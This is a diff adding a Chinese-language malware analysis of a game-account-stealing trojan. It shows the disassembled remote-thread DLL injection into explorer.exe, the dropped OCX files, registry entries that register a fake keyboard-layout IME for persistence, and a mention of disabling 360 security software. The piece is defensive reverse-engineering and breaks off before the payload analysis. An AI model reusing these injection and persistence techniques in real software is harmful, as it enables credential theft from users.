@@ -1,0 +1,185 @@
+
+# 注入函数分析
+
+```
+004019D7    55              push    ebp
+004019D8    8BEC            mov     ebp, esp
+004019DA    51              push    ecx
+004019DB    51              push    ecx
+004019DC    53              push    ebx
+004019DD    56              push    esi
+004019DE    57              push    edi
+004019DF    FF75 0C         push    dword ptr [ebp+C]
+004019E2    FF15 14104000   call    dword ptr [401014]               ; kernel32.lstrlenA
+004019E8    8B5D 08         mov     ebx, dword ptr [ebp+8]
+004019EB    8BF0            mov     esi, eax
+004019ED    46              inc     esi
+004019EE    6A 40           push    40
+004019F0    68 00100000     push    1000
+004019F5    56              push    esi
+004019F6    6A 00           push    0
+004019F8    53              push    ebx
+004019F9    FF15 44104000   call    dword ptr [401044]               ; kernel32.VirtualAllocEx，在进程中分配空间，大小21h，得到内存的首地址为02380000
+004019FF    8BF8            mov     edi, eax
+00401A01    85FF            test    edi, edi
+00401A03    74 3B           je      short 00401A40
+00401A05    8D45 FC         lea     eax, dword ptr [ebp-4]
+00401A08    50              push    eax
+00401A09    56              push    esi
+00401A0A    FF75 0C         push    dword ptr [ebp+C]
+00401A0D    57              push    edi
+00401A0E    53              push    ebx
+00401A0F    FF15 40104000   call    dword ptr [401040]               ; kernel32.WriteProcessMemory，这里将dbr99008.ocx写入到刚刚分配的进程空间02380000处
+00401A15    85C0            test    eax, eax
+00401A17    74 27           je      short 00401A40
+00401A19    8D45 F8         lea     eax, dword ptr [ebp-8]
+00401A1C    50              push    eax
+00401A1D    33C0            xor     eax, eax
+00401A1F    50              push    eax
+00401A20    57              push    edi
+00401A21    FF35 7C104000   push    dword ptr [40107C]               ; kernel32.LoadLibraryA
+00401A27    50              push    eax
+00401A28    50              push    eax
+00401A29    53              push    ebx
+00401A2A    FF15 3C104000   call    dword ptr [40103C]               ; kernel32.CreateRemoteThread创建远程线程
+0012F380   00000080  |hProcess = 00000080 (window)
+0012F384   00000000  |lpThreadAttributes
+0012F388   00000000  |dwStackSize = 0
+0012F38C   7C801D7B  |lpStartAddress = kernel32.LoadLibraryA
+0012F390   02380000  |lpParameter = 02380000
+0012F394   00000000  |dwCreationFlags = 0
+0012F398   0012F3A8  \lpThreadId = 0012F3A8
+00401A30    85C0            test    eax, eax
+00401A32    8945 0C         mov     dword ptr [ebp+C], eax
+00401A35    74 09           je      short 00401A40
+00401A37    6A FF           push    -1
+00401A39    50              push    eax
+00401A3A    FF15 38104000   call    dword ptr [401038]               ; kernel32.WaitForSingleObject
+00401A40    68 00400000     push    4000
+00401A45    56              push    esi
+00401A46    57              push    edi
+00401A47    53              push    ebx
+00401A48    FF15 34104000   call    dword ptr [401034]               ; kernel32.VirtualFreeEx
+00401A4E    837D 0C 00      cmp     dword ptr [ebp+C], 0
+00401A52    5F              pop     edi
+00401A53    5E              pop     esi
+00401A54    5B              pop     ebx
+00401A55    74 09           je      short 00401A60
+00401A57    FF75 0C         push    dword ptr [ebp+C]
+00401A5A    FF15 88104000   call    dword ptr [401088]               ; kernel32.CloseHandle
+00401A60    C9              leave
+00401A61    C3              retn
+```
+
+这个就是注入函数了！
+
+```
+004021DA    B9 81000000     mov     ecx, 81
+004021DF    33C0            xor     eax, eax
+004021E1    8DBD A9F5FFFF   lea     edi, dword ptr [ebp-A57]
+004021E7    889D A8F5FFFF   mov     byte ptr [ebp-A58], bl
+004021ED    F3:AB           rep     stos dword ptr es:[edi]
+004021EF    66:AB           stos    word ptr es:[edi]
+004021F1    AA              stos    byte ptr es:[edi]
+004021F2    8D85 BCFAFFFF   lea     eax, dword ptr [ebp-544]
+004021F8    50              push    eax
+004021F9    E8 ABF7FFFF     call    004019A9                          ；查找文件dbr31004.ocx，找到，没有跳转
+004021FE    8B35 BC104000   mov     esi, dword ptr [4010BC]          ; USER32.wsprintfA
+00402204    83C4 0C         add     esp, 0C
+00402207    85C0            test    eax, eax
+00402209    74 32           je      short 0040223D
+0040220B    8D85 B0F7FFFF   lea     eax, dword ptr [ebp-850]
+00402211    50              push    eax
+00402212    8D85 BCFAFFFF   lea     eax, dword ptr [ebp-544]
+00402218    50              push    eax
+00402219    8D85 B8F9FFFF   lea     eax, dword ptr [ebp-648]
+0040221F    50              push    eax
+00402220    8D85 A8F5FFFF   lea     eax, dword ptr [ebp-A58]
+00402226    68 8C154000     push    0040158C                         ; ASCII "%s %s pfjaoidjglkajd %s"
+0040222B    50              push    eax
+0040222C    FFD6            call    esi
+0040222E    8D85 A8F5FFFF   lea     eax, dword ptr [ebp-A58]
+00402234    50              push    eax
+00402235    E8 87FBFFFF     call    00401DC1                         ；创建进程gbvgbv31.exe
+0040223A    83C4 18         add     esp, 18
+0040223D    8D85 C8FDFFFF   lea     eax, dword ptr [ebp-238]
+00402243    50              push    eax
+00402244    E8 60F7FFFF     call    004019A9
+00402249    85C0            test    eax, eax
+0040224B    59              pop     ecx
+0040224C    74 2B           je      short 00402279
+0040224E    8D85 C8FDFFFF   lea     eax, dword ptr [ebp-238]
+00402254    50              push    eax
+00402255    8D85 B8F9FFFF   lea     eax, dword ptr [ebp-648]
+0040225B    50              push    eax
+0040225C    8D85 A8F5FFFF   lea     eax, dword ptr [ebp-A58]
+00402262    68 74154000     push    00401574                         ; ASCII "%s %s pfjieaoidjglkajd"
+00402267    50              push    eax
+00402268    FFD6            call    esi
+0040226A    8D85 A8F5FFFF   lea     eax, dword ptr [ebp-A58]
+00402270    50              push    eax
+00402271    E8 4BFBFFFF     call    00401DC1
+00402276    83C4 14         add     esp, 14
+00402279    53              push    ebx
+0040227A    FF15 68104000   call    dword ptr [401068]               ; kernel32.ExitProcess退出进程
+00402280    6A 01           push    1
+00402282    58              pop     eax
+00402283    5F              pop     edi
+00402284    5E              pop     esi
+00402285    5B              pop     ebx
+00402286    C9              leave
+00402287    C2 1000         retn    10
+```
+
+上述，通过`gbvgbv31.exe`运行`dbr31004.ocx`,`dbr99008.ocx`两个文件：
+
+`C:\WINDOWS\system32\dbr31004.ocx`                `0x10000000`                `0x0000E000`
+
+`C:\WINDOWS\system32\DBR99008.OCX`                `0x00C30000`                `0x00006000`
+
+注入到`explorer.exe`中的文件，`C:\WINDOWS\system32\dbr99008.ocx`   基址：`0x03800000`，大小：`0x00006000`
+
+                            `C:\WINDOWS\system32\dbr31004.ocx`   基址：`0x03EB0000`，大小：`0x0000E000`
+
+## 二
+
+现在来分析`dbr99008.ocx`,这个函数的主要作用修改注册表中的输入法表项，将`dbr99008.ocx`与`kbdus.dll`关联，如下：
+
+`HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layouts\E0200804`
+
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layouts\E0200804`
+
+```
+[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layouts\E0200804]
+Ime File = "DBR99008.OCX"
+Layout Text = "US"
+Layout File = "kbdus.dll"
+```
+
+```
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layouts\E0200804]
+Ime File = "DBR99008.OCX"
+Layout Text = "US"
+Layout File = "kbdus.dll"
+```
+
+```
+[HKEY_CURRENT_USER\Keyboard Layout\Preload]
+2 = "E0200804"
+```
+
+主要的坏事是在`dbr31004.ocx`文件中完成的，这里就不贴`dbr99008.ocx`的代码了
+
+还有就是在临时目录里生成了`win28007d9039.dll`这个文件，这个实际上就是`kernel32.dll`了
+
+## 三
+
+简单建立几个窗口，伪装成`ldjgame.exe`,`launch.exe`便于分析
+
+首先这是一个盗号木马，游戏有：鹿鼎记，SMDL(神魔大陆)，QQ游戏，之前做的记录全都没了,现在就简单的分析几个线程吧
+
+并干掉360系列
+
+`dbr31004.ocx`主要创建了7个线程：
+
+现在来看`dbr31004.ocx`文件的分析
